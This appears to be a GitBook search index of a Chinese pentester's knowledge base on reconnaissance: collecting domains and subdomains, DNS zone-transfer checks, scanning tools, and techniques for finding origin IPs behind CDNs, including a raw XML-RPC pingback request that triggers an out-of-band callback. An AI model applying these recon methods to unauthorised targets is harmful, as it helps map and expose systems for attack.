{"./":{"url":"./","title":"Introduction","keywords":"","body":" Introduction 关于我 BUG反馈 Introduction 个人的部分知识技能，倾向于使用知识库的方式进行总结回顾自己，后续会不断完善，抓住2021年最后的尾巴！ 关于我 邮箱：damit5@protonmail.com GitHub：https://github.com/damit5/ BUG反馈 问题反馈：issue提交 小时候我爱吃西红柿🍅 我以为我一辈子都会爱下去 后来长大了发现没那么爱了 我没错 西红柿也没错 错的是那自以为是的一生 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-03-22 19:00:27 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/","title":"01.主域名收集","keywords":"","body":"信息收集之主域名收集方法 我们获取了一个目标后，第一时间应该尽可能的发现更多的关联资产，扩大我们的攻击面 [!DANGER|style:flat] 而网上大多数文章第一步就是直接子域名收集了，也没讲怎么收集关联资产，为了获取更多的目标，这里也系统的总结一下 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 13:55:04 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/01.ICP备案查询.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/01.ICP备案查询.html","title":"01.ICP备案查询","keywords":"","body":" ICP备案查询 什么是ICP备案 有何作用 如何查询 第三方查询网站 ICP备案查询 什么是ICP备案 ICP备案是指网站在信息产业部提交网站信息进行官方认可。对国内各大小网站(包括企业及个人站点)的严格审查工作，对于没有合法备案的非经营性网站或没有取得ICP许可证的经营性网站，根据网站性质，将予以罚款，严重的关闭网站，以此规范网络安全，打击一切利用网络资源进行不法活动的犯罪行为。也就是说，只要是盈利为目的的网站，都要进行ICP备案，否则会受到相应的处罚。 国内使用国内服务器的网站，都必须要先办理ICP备案后才可以上线。 有何作用 通过查询目标企业的备案信息，可直接获取到目标企业注册了哪些域名，从而增加可渗透的目标范围。 如何查询 [!TIP] 推荐使用官方网站ICP/IP地址/域名信息备案管理系统 支持使用单位名称、域名和备案号进行查询 使用单位名称查询 使用域名查询 使用备案号查询 使用任意参数查询后，可通过相关的信息查询其他相关的域名达到收集目标域名的目的。 第三方查询网站 ICP备案查询 - 站长工具 站长seo综合查询工具-爱站网 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 13:31:22 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/02.证书查询.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/02.证书查询.html","title":"02.证书查询","keywords":"","body":" 证书查询 什么是证书 有何作用 如何查询 浏览器直接查看 通过在线网站 通过网络空间搜索引擎 证书查询 什么是证书 SSL证书是一种遵守SSL协议的服务器数字证书，由受信任的根证书颁发机构颁发。 SSL证书采用SSL协议进行通信，SSL证书部署到服务器后，服务器端的访问将启用HTTPS协议。 您的网站将会通过HTTPS加密协议来传输数据，可帮助服务器端和客户端之间建立加密链接，从而保证数据传输的安全。 有何作用 通过查询共用SSL证书的网站，可以找到相关的其他域名。 如何查询 此处推荐3种方法。 浏览器直接查看 点击更多信息 选择“安全-->查看证书” 可以看到很多的主域名 通过在线网站 [!TIP] 推荐使用 crt.sh 输入域名即可查询 通过网络空间搜索引擎 [!NOTE] 以Fofa为例，shodan和zoomeye类似 可查询fofa语法手册： 语法 说明 cert=\"baidu\" 搜索证书(https或者imaps等)中带有baidu的资产。 cert.subject=\"Oracle Corporation\" 搜索证书持有者是Oracle Corporation的资产 cert.issuer=\"DigiCert\" 搜索证书颁发者为DigiCert Inc的资产 cert.is_valid=true 验证证书是否有效，true有效，false无效 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 13:44:33 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/03.DNS共享记录查询.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/03.DNS共享记录查询.html","title":"03.DNS共享记录查询","keywords":"","body":" DNS共享记录查询 什么是DNS 有何作用 如何查询 DNS共享记录查询 什么是DNS DNS（Domain Name Server，域名服务器）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名(domain name)和与之相对应的IP地址 (IP address)的表，以解析消息的域名。 域名是Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。域名是由一串用点分隔的名字组成的，通常包含组织名，而且始终包括两到三个字母的后缀，以指明组织的类型或该域所在的国家或地区。 有何作用 此处通过查询共享DNS服务器的主机来获取到相关的域名； 需要注意的是，如果是公开的DNS服务器，那么查询的效果将会特别差。 如何查询 首先查询目标是否存在自建的NS服务器 将获取到的NS服务器带入 https://hackertarget.com/find-shared-dns-servers/ 进行查询 此处查询的结果并不全是属于目标范围，需要进一步的确认和观察。 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 13:46:10 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/04.WHOIS查询.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/04.WHOIS查询.html","title":"04.WHOIS查询","keywords":"","body":" WHOIS查询 什么是WHOIS 有何作用 如何查询 Linux本地WHOIS查询 在线查询网站 在线查询演示 WHOIS查询 什么是WHOIS WHOIS是用来查询互联网中域名的IP以及所有者等信息的传输协议。早期的WHOIS查询多以命令行接口存在，但是现在出现了一些基于网页接口的简化在线查询工具，甚至可以一次向不同的数据库查询。网页接口的查询工具仍然依赖WHOIS协议向服务器发送查询请求，命令行接口的工具仍然被系统管理员广泛使用。 有何作用 通过查询目标的WHOIS信息，对联系人、联系邮箱等信息进行反查，获取更多相关的域名信息。 重点关注注册商、注册人、邮件、DNS解析服务器、注册人联系电话。 如何查询 Linux本地WHOIS查询 在线查询网站 域名Whois查询 - 站长之家 站长工具whois查询工具爱站网 国家域名whois 全球 WHOIS 查询 域名信息查询 - 腾讯云 whois查询-中国万网 在线查询演示 此处以站长之家查询为例，输入域名即可进行查询 点击联系人后方的 whois反查 进行联系人反查 点击联系邮箱后方的 whois反查 进行邮箱反查 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 13:34:29 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/05.IP反查.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/05.IP反查.html","title":"05.IP反查","keywords":"","body":" IP反查 有何作用 如何查询 IP反查 有何作用 目标多个域名可能绑定在同一IP上，通过IP反查一定情况下可获取到其他的域名信息。 如何查询 [!TIP] 同IP网站查询，同服务器网站查询 - 站长工具 Online investigation tool - Reverse IP, NS, MX, WHOIS and Search Tools 输入相关的域名或IP地址即可查询。 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 13:46:41 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/06.股权信息.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/06.股权信息.html","title":"06.股权信息","keywords":"","body":"股权信息 通过查询股权信息，或者股权穿透图，寻找子公司和孙公司等，一般对外投资超过50%或者有行政权限的都可以算目标 查询网站： 天眼查：https://www.tianyancha.com/ 企查查：https://www.qcc.com/ 如查询字节跳动 通过查询子公司，再查询子公司对应的产品，可以大范围的扩大攻击面 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-25 15:14:07 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/07.Hackerone.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/07.Hackerone.html","title":"07.Hackerone","keywords":"","body":"Hackerone 一些在hackerone上进行众测的厂商，会把自己的测试范围列举出来，其中就包含有大量的域名，因此通过hackerone来完善资产收集也是一个不错的方法。 以阿里为例：https://hackerone.com/alibaba?type=team&view_policy=true Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-03-08 17:02:06 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/08.Google.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/08.Google.html","title":"08.Google","keywords":"","body":"Google Google直接搜索里面的一些关键内容来查询，比如公司名、备案、引用的特殊js等 还是以阿里为例 intext:浙ICP备09002987号 intext:33010002000070 -www Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-03-08 17:24:02 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/","title":"02.子域名收集","keywords":"","body":" 信息收集之子域名收集 参考链接 信息收集之子域名收集 前面总结了主域名收集的思路和方法，但除了主域名外，子域名也是域名信息收集中的一个重要环节，在当今各种防护设备满天飞的情况下，想要拿下主域名越来越难，但我们可以使用迂回策略，从子域名下手，慢慢靠近主域名以达到shell的目的。 子域名收集可以帮助我们发现目标对外开放的更多的资产，如果能找到一些被遗忘或目标不关注的子域名，将其作为突破点，可能达到事半功倍的效果。 子域名收集的方式很多，但如何尽可能全的收集到所有的子域名却不是那么容易的事儿；本次将从手工和工具两种方式进行总结。 参考链接 红蓝对抗之域名搜集方法总结 子域名收集笔记 从代码角度看各类子域名收集工具 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 14:14:20 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/01.证书透明度.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/01.证书透明度.html","title":"01.证书透明度","keywords":"","body":" 证书透明度收集子域 介绍 收集方法 证书透明度收集子域 介绍 要向用户提供加密流量，网站必须先向可信的证书授权中心 (CA) 申请证书。然后，当用户尝试访问相应网站时，此证书即会被提供给浏览器以验证该网站。近年来，由于 HTTPS 证书系统存在结构性缺陷，证书以及签发证书的 CA 很容易遭到入侵和操纵。Google 的证书透明度项目旨在通过提供一个用于监测和审核 HTTPS 证书的开放式框架，来保障证书签发流程安全无虞。 收集方法 可以通过以下链接进行在线查询： crtsh entrust censys google spyse certspotter（每小时免费查询100次） facebook（需要登录） 输入域名，即可查询 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 14:01:02 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/02.DNS域传送.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/02.DNS域传送.html","title":"02.DNS域传送","keywords":"","body":" DNS域传送 介绍 检测方法 nslookup dig nmap DNS域传送 介绍 DNS服务器分为主服务器，备份服务器，缓存服务器。 域传送是指备份服务器从主服务器上复制数据，然后更新自身的数据库，以达到数据同步的目的，这样是为了增加冗余，一旦主服务器出现问题可直接让备份服务器做好支撑工作。 而域传送漏洞则是由于DNS配置不当，导致匿名用户可以获取某个域的所有记录，造成整个网络的拓扑结构泄露给潜在的攻击者，凭借这份网络蓝图，攻击者可以节省大量的扫描时间，同时提升了目标的准确度。 检测方法 nslookup # 查询nameserver nslookup -type=ns knownsec.com 119.29.29.29 # 指定nameserver，列举域名信息 nslookup server f1g1ns1.dnspod.net ls knownsec.com [!NOTE] 如果提示无法列出域，那就说明此域名不存在域传送漏洞。 dig axfr 是q-type类型的一种，axfr类型是Authoritative Transfer的缩写，指请求传送某个区域的全部记录。 我们只要欺骗dns服务器发送一个axfr请求过去，如果该dns服务器上存在该漏洞，就会返回所有的解析记录值 # 找到NS服务器 dig knownsec.com ns # 发送axfr请求 dig axfr @f1g1ns2.dnspod.net knownsec.com nmap nmap的脚本dns-zone-transfer可以帮我们探测是否存在域传送漏洞 nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=knownsec.com -p 53 -Pn f1g1ns1.dnspod.net Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 14:05:19 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/03.DNS公开数据集.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/03.DNS公开数据集.html","title":"03.DNS公开数据集","keywords":"","body":" DNS公开数据集 介绍 收集方法 DNS公开数据集 介绍 Rapid7的开源数据项目收集了多种全互联网范围内的扫描数据，任何人都可下载这些数据，而本次主题中主要涉及两个数据集，分别是FDNS和RDNS，可从中获取到大量的子域名信息。 收集方法 Find DNS Host Records (Subdomains) netcraft Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 14:06:14 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/04.搜索引擎.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/04.搜索引擎.html","title":"04.搜索引擎","keywords":"","body":" 搜索引擎 介绍 收集方法 普通搜索引擎 空间搜索引擎 搜索引擎 介绍 搜索引擎通过对互联网进行大量爬行后，往往收集了大量的子域名，只需要输入对应的语法，就可以从搜索引擎的数据库中查询到我们想要的内容。 收集方法 普通搜索引擎 此处以Google为例，使用减号来排除不想收集到的子域名 site:knownsec.com -www 空间搜索引擎 此处以zoomeye为例 https://www.zoomeye.org/searchResult?q=site%3A%20knownsec.com site: knownsec.com Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 14:06:51 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/05.信息泄露.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/05.信息泄露.html","title":"05.信息泄露","keywords":"","body":" 信息泄露 网站爬虫 文件泄漏 代码仓库 信息泄露 网站爬虫 很多网站的页面中，会有跳转到其他系统的功能，如OA、邮箱系统等，其中可能就包含有其他子域名相关的信息，此外部署了内容安全策略（CSP）的网站在header头Content-Security-Policy中，也可能存在域名的信息。可使用burpsuite或者awvs类工具对站点进行爬取分析。 文件泄漏 很多网站有跨域策略文件crossdomain.xml、站点地图sitemap.xml和robots.txt等，其中也可能存在子域名的信息。 代码仓库 [!NOTE] 此处以GitHub为例，其他的如gitlab、gitee都可以尝试 在GitHub中直接搜索域名关键词，除了可以发现敏感的泄漏信息外，也可以发现部分子域名信息。 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 14:09:06 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/06.第三方在线平台.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/06.第三方在线平台.html","title":"06.第三方在线平台","keywords":"","body":" 第三方在线平台 介绍 收集方法 第三方在线平台 介绍 通过第三方在线平台提供的一些服务，可以快速发现部分子域名。 使用各种搜索引擎搜索关键词 在线子域名查询 即可快速寻找到一些直接可用的在线平台 收集方法 Find DNS Host Records | Subdomain Finder | HackerTarget.com DNSdumpster.com - dns recon and research, find and lookup dns records virustotal 域名查iP 域名解析 iP查询网站 iP反查域名 iP反查网站 同一iP网站 同iP网站域名iP查询 threatminer Subdomain Finder threatbook（需要高级权限） 子域名查询 - 站长工具（需要登录） Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 14:10:01 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/07.子域名枚举爆破.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/07.子域名枚举爆破.html","title":"07.子域名枚举爆破","keywords":"","body":" 子域名枚举爆破 介绍 收集方法 子域名枚举爆破 介绍 所谓子域名枚举爆破，就是通过不断的拼接字典中的子域名前缀去枚举域名的A记录，如gm7.org拼接前缀test组合成test.gm7.org，再对其进行验证，但是该方法一般需要解决泛解析问题。 收集方法 获取一些常见子域名前缀后，整理成字典，依次拼接主域名在浏览器进行访问验证即可，或通过nslookup进行验证即可。 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 14:12:38 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/08.工具自动化.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/08.工具自动化.html","title":"08.工具自动化","keywords":"","body":" 工具自动化 OneForAll subfinder ksubdomain JSINFO-SCAN Layer子域名挖掘机 工具自动化 通过前面手工部分的讲解，可以看到大多收集步骤均为重复性的工作，那如果把所有的手工操作都自动化结合成一个工具，那么肯定能够达到事半功倍的效果。 OneForAll https://github.com/shmilylty/OneForAll 解决大多传统子域名收集工具不够强大、不够友好、缺少维护和效率问题的痛点，是一款集百家之长，功能强大的全面快速子域收集终极神器。 subfinder https://github.com/projectdiscovery/subfinder brew install subfinder Subfinder 是一个子域发现工具，它通过使用被动在线资源来发现网站的有效子域。它具有简单的模块化架构，并针对速度进行了优化。 subfinder 是为只做一件事而构建的——被动子域枚举，它做得很好。 config文件路径~/.config/subfinder/config.yaml ksubdomain https://github.com/knownsec/ksubdomain ksubdomain是一款基于无状态子域名爆破工具，支持在Windows/Linux/Mac上使用，它会很快的进行DNS爆破，在Mac和Windows上理论最大发包速度在30w/s,linux上为160w/s的速度。 JSINFO-SCAN https://github.com/p1g3/JSINFO-SCAN 递归爬取域名(netloc/domain)，以及递归从JS中获取信息的工具 Layer子域名挖掘机 https://github.com/euphrat1ca/LayerDomainFinder Layer子域名挖掘机是一款子域名收集工具，拥有简洁的界面和简单的操作模式，支持服务接口查询和暴力枚举获取子域名信息，同时可以通过已获取的域名进行递归爆破。 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-02-20 21:31:04 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/09.构造域名.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/09.构造域名.html","title":"09.构造域名","keywords":"","body":" 构造域名 altdns 构造域名 前面通过各种收集方式已经获取到了大量的子域名了，但这真的就是全部了吗？？当然不是！！！！ 我们可以通过置换再生成一批域名，比如我们收集到admin.aaa.xxx.com，那么是不是也可能存在一个dev-admin.aaa.xxx.com呢？ 通过这种方式再生成一批，然后验证存活率，结果肯定会更全！！！ 之前自己写过工具，后面发现已经有前人写好了，那就是 altdns altdns https://github.com/infosec-au/altdns Altdns is a DNS recon tool that allows for the discovery of subdomains that conform to patterns. Altdns takes in words that could be present in subdomains under a domain (such as test, dev, staging) as well as takes in a list of subdomains that you know of. 自己看说明文档吧，可以根据经验自定义或者补充添加一些关键词... Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-06 14:35:06 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/10.存活性探测.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/10.存活性探测.html","title":"10.存活性探测","keywords":"","body":" 存活性探测 httpx WebAliveScan Finger 存活性探测 获取了大量域名后，我们往往需要判断域名是否存活，域名对应的功能是什么 httpx https://github.com/projectdiscovery/httpx httpx -title -tech-detect -content-length -random-agent -status-code -title -timeout 2 -threads 50 -l domain.txt WebAliveScan https://github.com/broken5/WebAliveScan https://github.com/broken5/bscan 对目标域名进行快速的存活扫描、简单的指纹识别、目录扫描，一图胜千言 Finger https://github.com/EASY233/Finger 一款红队在大量的资产中存活探测与重点攻击系统指纹探测工具 python3 Finger.py -h Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-02-20 21:34:28 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/","title":"03.IP段信息收集","keywords":"","body":"获取了一些基本的信息如域名等后，为了扩大我们的攻击面，因此我们要尝试发现更多的目标，如IP段的目标 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 16:49:41 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/01.绕过CDN寻找真实IP.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/01.绕过CDN寻找真实IP.html","title":"01.绕过CDN寻找真实IP","keywords":"","body":" 判断是否存在CDN 多地ping nslookup法 IP反查域名 观察header 在线检测工具 寻找真实IP 网络空间测绘引擎 二级域名法 邮箱 海外ping DNS历史解析记录 SSL证书 在线 命令行工具 敏感文件泄漏 历史域名 通过 XML-RPC PINGBACK 通信 APP 漏洞 通过 virtual-host 碰撞 通过 favicon.ico 哈希特征 通过网页源码特征值 通过域名备案信息广域探测（成功率高） 找到真实 IP 后如何使用 参考 判断是否存在CDN 多地ping 如果没有使用CDN，则只会显示一个IP地址。 可以使用以下站点进行多地ping， http://ping.chinaz.com/ https://ping.aizhan.com/ http://www.webkaka.com/Ping.aspx https://www.host-tracker.com/v3/check/ 如图则不存在CDN nslookup法 用国外的dns服务器 如果返回域名解析对应多个 IP 地址多半是使用了 CDN nslookup -qt=A h5.hunbei.com 8.8.8.8 用国外的可能会得到真实IP 不存在： 存在： IP反查域名 查看是否存在大量不相关的IP https://securitytrails.com/ https://dns.aizhan.com/ https://x.threatbook.cn 如下图可以看出来是使用了CDN 观察header 观察请求响应的返回数据的头部，是否有 CDN 服务商标识 若 asp 或者 asp.net 网站返回头的 server 不是 IIS、而是 Nginx，则多半使用了nginx反向代理到 CDN 在线检测工具 https://www.cdnplanet.com/tools/cdnfinder/ https://tools.ipip.net/cdn.php https://whatsmycdn.com/ 寻找真实IP 网络空间测绘引擎 zoomeye、fofa等，搜索站点相关信息，有一定几率能够获取到站点的真实IP fofa shodan quake Censys.io 二级域名法 由于部分CDN价格昂贵，所以一些重要的站点会使用CDN加速，而一些子域名则没有使用，且极有可能和主站在同一C段，这时候，就可以通过发现目标的子域名，从而根据IP来定位主域名的IP地址。 oneforall ksubdomain Jsinfo-scan 邮箱 用目标邮件服务器发送邮件给自己(QQ邮箱)再查看邮件源码一定情况下可以找到真实IP（服务端和我们建立连接） 这里还有一个奇淫技巧，通过发送邮件给一个不存在的邮箱地址，比如 000xxx@domain.com ，因为该用户不存在，所以发送将失败，并且还会收到一个包含发送该电子邮件给你的服务器的真实 IP 通知。 RSS 订阅 邮箱注册、激活处 邮箱找回密码处 产品更新的邮件推送 某业务执行后发送的邮件通知 员工邮箱、邮件管理平台等入口处的忘记密码 海外ping 由于国内厂家可能只针对国内使用cdn，对海外没有铺设，导致通过通过海外的IP可以直接获取到真实IP。 可以使用： http://ping.chinaz.com/ https://asm.ca.com/zh_cn/ping.php http://host-tracker.com/ http://www.webpagetest.org/ https://dnscheck.pingdom.com/ 进行查询 DNS历史解析记录 https://dnsdb.io/zh-cn/ https://securitytrails.com/ https://x.threatbook.cn/ http://toolbar.netcraft.com/site_report?url= https://viewdns.info/iphistory/?domain= 以微步在线为例 找到站点 判断存在CDN 微步查询 确认为真实IP 这些很有可能就是在使用CDN之前留下的解析记录 SSL证书 在线 https://censys.io/certificates?q=parsed.names.raw%3A+%22baidu.cn%22+and+tags.raw%3A+trusted # 查询有效的证书 Certificates: parsed.names.raw: \"baidu.cn\" and tags.raw: trusted # 注意 # 测试过程中，很容易陷入思维误区，认为 有效 的证书才是我们需要的，但其实并不一定，很多服务器配置错误依然保留的是 无效 的证书 sha1 签名反查IPV4 https://crt.sh/ 命令行工具 openssl openssl s_client -connect hao123.com:443 | grep subject curl curl -v https://hao123.com | grep 'subject' 敏感文件泄漏 服务器日志文件 探针文件，例如 phpinfo 网站备份压缩文件 .DS_Store .hg .git SVN Web.xml 历史域名 很多网站在发展的过程中，会更换域名，比如京东以前的域名是 360buy.com ，后来斥巨资购买了 jd.com 。 网站在更换新域名时，如果将 CDN 部署到新的域名上，而之前的域名由于没过期，可能未使用 CDN，因此可以直接获得服务器 IP，所以，历史域名也是一个很重要的点。 通过 XML-RPC PINGBACK 通信 XML-RPC 是支持 WordPress 与其他系统之间通信的规范，它通过使用 HTTP 作为传输机制和 XML 作为编码机制来标准化这些通信过程。 在 WordPress 的早期版本中，默认情况下已关闭 XML-RPC，但是从3.5版本开始，默认情况下开启。 XML-RPC 支持 trackback 和 pingback。 虽然 WordPress 启用了 REST API 来代替 XML-RPC ，不过 XML-RPX 不会过时的，放心大胆的使用就好，虽然 XML-RPC 这个技术很老了，但依然可以通杀很多网站。 POST /xmlrpc.php HTTP/1.1 Host: domain.com Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en,zh-CN;q=0.9,zh;q=0.8 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 323 pingback.ping http://2vbis4.dnslog.cn https://domain.com/ APP 目标若存在APP，则APP可能通过IP直接与服务端进行通信，若最新版采用域名通信，也可尝试寻找历史版本进行分析。 历史版本宝贝一般很多 漏洞 如果目标网站本身存在漏洞的话，比如 SSRF、XXE、XSS、文件上传、命令执行等漏洞，或者我们找到的其他突破口，注入我们自己的带外服务器地址，然后在服务器上检查 HTTP 日志记录。 应用本身的错误会造成当传递一些错误的参数值或者错误的地址时，内部会抛出异常，也就是日常所说的报错，关注报错点，经常会泄露一些真实的 IP 地址或者内网 IP 段。 通过 virtual-host 碰撞 当我们收集了目标足够多的可能的真实 IP 时，可以通过 IP 和子域的碰撞，来批量获得命中目标以及目标哪些的子域。 在线收集工具 https://pentest-tools.com/information-gathering/find-virtual-hosts# 通过 favicon.ico 哈希特征 favicon.ico 是现代浏览器在网页标题的左侧显示的一个小图标。 该图标数据通常是从 https://anywebsite/favicon.ico 处获取的，浏览器会在浏览任何网站时自动请求它。 因为可以通过计算 favicon.ico 的指纹哈希，然后去 shodan 等搜索引擎搜索与之相同的主机结果，从而进一步探测是否能挖掘出目标网站的真实 IP 地址。 目前网络空间搜索引擎均支持 通过网页源码特征值 在服务器源 IP 地址允许访问并且返回的也是类似的网站内容情况下，可以通过侦察页面源码中 JS 、CSS 、HTML 等一系列静态特征值，然后用 Shodan 、Zoomeye 、Censys 等搜索引擎进行匹配搜索，从而定位 IP 。 通过域名备案信息广域探测（成功率高） 针对目标域名，目标二级域名，如果都做了 CDN 的情况下，是不是就思路中断了呢？ 肯定不是。这里分享一个很少有人去关注的独门秘技。 网站需要服务器，但是再土豪的公司，也不可能一个域名一台服务器，大多数情况下，都是多个域名业务，共用一台服务器。 那么如果目标网站存在备案，可以查询其备案信息，收集该单位或者个人备案的其他网站域名以及其他子域，然后再进行一轮广域的探测，很有可能其中的某个边缘子域，没有做 CDN，就直接暴露了真实服务器的 IP 地址，然后再进一步验证该 IP 是否也是目标网站的真实 IP 。 找到真实 IP 后如何使用 在获取到真实IP后，通过直接访问IP可能无法访问，那么此时提供2种思路进行解决 通过修改 hosts 文件，将域名和 IP 绑定。（要是不会，不建议阅读此文。） 如使用 burpsuite 测试，可以在 Project options ----> Connections ----> Hostname Resolution 中增加域名和 IP 记录。 参考 https://github.com/bin-maker/2021CDN/blob/main/CDN%202021%20%E5%AE%8C%E5%85%A8%E6%94%BB%E5%87%BB%E6%8C%87%E5%8D%97%EF%BC%88%E4%B8%80%EF%BC%89.md https://www.anquanke.com/post/id/227818 https://www.anquanke.com/post/id/231437 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-27 15:22:58 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/02.IP段查询.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/02.IP段查询.html","title":"02.IP段查询","keywords":"","body":"有时候，目标如果比较大，可以通过ipwhois.cnnic.net.cn来查看运营商给他们分配的IP段，然后再对这些段进行测试即可。 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-29 15:57:18 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/03.网络空间搜索引擎.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/03.网络空间搜索引擎.html","title":"03.网络空间搜索引擎","keywords":"","body":" 网络空间搜索引擎 关键词搜索 icon图标搜索 C段查询 网络空间搜索引擎 通过网络空间搜索引擎搜索目标IP以及C段，来快速发现目标资产的IP地址段上的端口开放情况（时间充足还是建议手动扫一遍） [!NOTE] 主要参考各产品的手册用法，以及发挥自己的思路，这里列举几个抛砖引玉 fofa（不知道还能不能恢复） zoomeye:https://www.zoomeye.org/ quake:https://quake.360.cn/quake/welcome#/ hunter:https://hunter.qianxin.com/ shodan:https://www.shodan.io/ [!TIP] 尽量尝试证书、图标、备案内容等各种方式，还有关键词如 body=\"南方电网\" ，不一定要全称，简写往往有更好的效果 关键词搜索 title:\"知道创宇\" +country:\"CN\" -subdivisions:\"香港\" icon图标搜索 iconhash: \"d920f3d126f9d3806bbab5412541e7b6\" C段查询 [!WARNING] 因为搜索引擎是从数据库中拿取数据，因此可能具有实效性，部分结果不准确 cidr: \"1.2.3.4/24\" 列举一些常用的搜索引擎，排名不分先后 Zomeye Fofa 360quake shodan Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-26 12:12:41 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/04.C段扫描工具.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/04.C段扫描工具.html","title":"04.C段扫描工具","keywords":"","body":" 端口&C段扫描 Nmap msscan 